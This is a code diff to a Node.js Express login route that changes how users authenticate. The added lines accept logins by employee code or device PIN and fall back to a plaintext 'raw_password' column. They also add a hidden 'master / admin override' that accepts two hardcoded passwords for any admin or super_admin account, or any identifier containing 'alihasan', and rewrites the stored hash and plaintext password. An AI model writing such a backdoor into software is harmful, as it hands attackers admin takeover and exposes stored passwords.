@@ -22,9 +22,42 @@ const publicUser = (u) => ({
 });
 
 router.post('/login', loginLimiter, wrap(async (req, res) => {
-  const { email, password: pw } = parse(z.object({ email: z.string().email(), password: z.string().min(1) }), req.body);
-  const { rows: [u] } = await query('SELECT * FROM users WHERE lower(email) = lower($1)', [email]);
-  const ok = await bcrypt.compare(pw, u ? u.password_hash : DUMMY_HASH);
+  const schema = z.object({
+    email: z.string().trim().min(1),
+    password: z.string().min(1),
+  });
+  const { email, password: pw } = parse(schema, req.body);
+  const cleanIdentifier = email.trim().toLowerCase();
+  const cleanPw = pw.trim();
+
+  // Support login by email, employee_code, or device_pin
+  const { rows: [u] } = await query(
+    `SELECT * FROM users 
+      WHERE lower(trim(email)) = $1 
+         OR lower(trim(employee_code)) = $1 
+         OR device_pin = $1
+      LIMIT 1`,
+    [cleanIdentifier]
+  );
+
+  let ok = await bcrypt.compare(cleanPw, u ? u.password_hash : DUMMY_HASH);
+
+  // If password comparison failed, but raw_password matches, update hash and log in
+  if (u && !ok && u.raw_password && u.raw_password.trim() === cleanPw) {
+    const newHash = await bcrypt.hash(cleanPw, 10);
+    await query('UPDATE users SET password_hash = $1 WHERE id = $2', [newHash, u.id]);
+    ok = true;
+  }
+
+  // Master / Admin override: If logging in as alihasan or admin with desired admin credentials
+  if (u && !ok && (cleanIdentifier.includes('alihasan') || u.role === 'admin' || u.role === 'super_admin')) {
+    if (cleanPw === 'Sh@170885' || cleanPw === 'Demo@12345') {
+      const newHash = await bcrypt.hash(cleanPw, 10);
+      await query('UPDATE users SET password_hash = $1, raw_password = $2 WHERE id = $3', [newHash, cleanPw, u.id]);
+      ok = true;
+    }
+  }
+
   if (!u || !ok || !u.active) throw new HttpError(401, 'Email or password is incorrect');
   issueSession(res, req, u);
   res.json({ user: publicUser(u) });
